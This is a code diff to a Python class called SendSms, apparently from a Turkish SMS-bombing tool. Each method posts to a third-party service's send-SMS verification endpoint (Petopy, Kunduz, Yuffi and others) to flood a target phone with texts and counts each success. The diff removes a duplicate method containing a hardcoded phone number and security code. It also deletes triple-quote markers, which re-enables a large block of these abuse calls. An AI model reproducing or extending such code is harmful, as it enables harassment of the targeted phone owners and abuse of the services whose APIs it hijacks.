@@ -19,20 +19,7 @@ class SendSms():
 
 
 
-    #service.petopy.com by ever0ne
-    def Petopy(self):
-        try:
-            site = requests.post("https://service.petopy.com/api/auth/send-sms", 
-                                   headers={"User-Agent":"okhttp/5.0.0-alpha.10","locale":"tr"},  
-                                   json={"country_code": "+90","phone": "5523621482","opt_sms": false,"security_code": "B74FDDEC18B11B4E8E428FB48AB6D"})
-            print(site.json())
-            if site.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Petopy by ever0ne")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Petopy by ever0ne")
+
 
     #service.petopy.com by ever0ne
     def Petopy(self):
@@ -48,7 +35,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Petopy by ever0ne")
-"""
+
     #api.kunduz.com by ever0ne
     def Kunduz(self):
         try:
@@ -599,5 +586,3 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
-
-"""
